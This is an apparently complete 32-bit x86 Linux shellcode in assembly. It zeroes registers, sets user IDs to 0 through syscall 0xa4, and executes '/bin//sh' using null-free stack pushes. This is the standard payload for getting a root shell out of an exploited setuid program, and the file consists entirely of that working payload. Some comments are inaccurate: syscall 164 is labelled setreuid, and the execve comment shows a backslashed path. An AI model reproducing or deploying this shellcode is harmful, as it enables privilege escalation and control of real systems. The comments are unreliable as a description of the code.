BITS    32      ;

; setreuid( ruid, euid, guid )
xor eax,eax ; Zero out EAX
xor ebx,ebx ; Zero out EBX
xor ecx,ecx ; Zero out ECX
xor edx,edx ; Zero out EDX
mov al,0xa4 ; a4 = 164 Syscall - setreuid()
int 0x80    ; Trigger syscall

; execve( filename, argv[], envp[] )
xor     eax,eax     ; Zero out EAX
mov     al,11       ; Put 11 in EAX syscall for execve()
push    ecx         ; Push 0000 to stack
push    0x68732f2f  ; Push '//sh'
push    0x6e69622f  ; Push '/bin'
mov     ebx,esp     ; put the string address to EBX
push    ecx         ; Push 0000.. to stack
mov     edx,esp     ; put 0 in EDX for envp
push    ebx         ; push start of string to stack
mov     ecx,esp     ; This is start of argv
int     0x80        ; execve("\bin\\sh",["/bin//sh",NULL],NULL)
